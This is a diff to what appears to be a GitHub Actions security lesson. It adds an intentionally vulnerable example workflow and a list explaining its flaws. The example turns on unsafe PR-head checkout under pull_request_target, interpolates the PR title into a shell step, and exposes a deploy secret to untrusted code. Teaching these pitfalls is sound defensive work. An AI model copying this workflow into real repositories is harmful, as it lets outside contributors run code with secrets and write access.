+      explain: 'Long-lived cloud access keys stored as secrets: the workflow gets short-lived credentials by proving its identity. No stored secret means nothing to leak. The cloud trusts a specific repository, branch and workflow; OIDC says who is asking, not whether the code is good.',
     },
     {
       q: 'Why cancel superseded runs on pull requests but not on main?',
@@ -317,7 +405,7 @@ Free, with a GitHub account. You'll work in your own **fork** of this repository
         'To keep main’s cache warm, since cancelled runs don’t save a cache',
       ],
       answer: 1,
-      explain: 'On a PR only the latest commit matters; on main every commit should keep a result, so you know which commit broke something. Concurrency saves time without losing the history that matters.',
+      explain: 'On a PR only the latest commit matters; on main every commit should keep a result, so you know which commit broke something. Concurrency saves time without losing the history that matters. This repository uses a unique group per run on main for exactly this reason.',
     },
   ]}
 />
@@ -331,15 +419,17 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v5
-        with: { ref: "${{ github.event.pull_request.head.sha }}" }
+      - uses: actions/checkout@v7
+        with:
+          ref: "${{ github.event.pull_request.head.sha }}"
+          allow-unsafe-pr-checkout: true
       - run: npm install && npm test
       - run: echo "Testing ${{ github.event.pull_request.title }}"
       - run: curl -H "Authorization: Bearer ${{ secrets.DEPLOY_KEY }}" https://deploy.example.com/preview
       - uses: someone/cool-action@main
 ```
 
-- **`pull_request_target` + checking out the PR's code + running it (`npm install && npm test`)**: anyone who opens a PR runs their code with your secrets and a write token. Use `pull_request` for testing untrusted code.
+- **`pull_request_target` + checking out the PR's code + running it (`npm install && npm test`)**: anyone who opens a PR runs their code with your secrets and a write token. `allow-unsafe-pr-checkout: true` is the author switching off the very guard that would have stopped this. Use `pull_request` for testing untrusted code.
 - **No `permissions:` block**: the token may have write access.
 - **Script injection** via the PR title in `run:`. Pass it through `env:`.
 - **A secret used in a job that runs untrusted code**: `DEPLOY_KEY` is exposed to it. Deploy previews belong in a separate, trusted job or workflow.
